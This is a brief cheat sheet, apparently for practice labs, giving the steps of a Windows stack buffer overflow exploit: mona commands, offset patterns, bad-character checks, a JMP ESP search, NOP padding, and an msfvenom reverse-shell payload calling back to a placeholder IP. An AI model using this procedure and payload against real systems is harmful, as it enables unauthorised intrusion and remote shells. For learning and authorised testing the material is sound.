Buffer overflow
================================================================
- Set workingfolder	
    `!mona config -set workingfolder c:\mona\%p`
- Fuzzing	
    `Using fuzzer.py`
- create pattern on bytes crashes	
    `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [bytes]`
- findmsp on bytes crashes	
    `!mona findmsp -distance [bytes_range]`

- check for eip offset value

- set value offset and retn value	

- Make sure eip same with retn value	

- check bad character	
    `!mona bytearray -b "\x00"`

- generate a string of bad character	
    `Using badchars.py`

- compare bad character 	
    `!mona compare -f bytearray.bin -a [esp address]`

- check list possible bad chars	

- generate new bad chars with possible chars we found until unmodified with esp address	

- find jump point choose the top one	
    `!mona jmp -r esp -cpb  "\x00[possible bad chars]"`

update retn with new address from jump point	
    `retn = reverse address ("\xaf\x11\x50\x62")`

- create msfvenom payload 	
    `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "[badchars]" -f c`

- add padding	
    `"\x90" * 16`

-   Search through directories in the `$PATH` environment variable  
    `which sbd`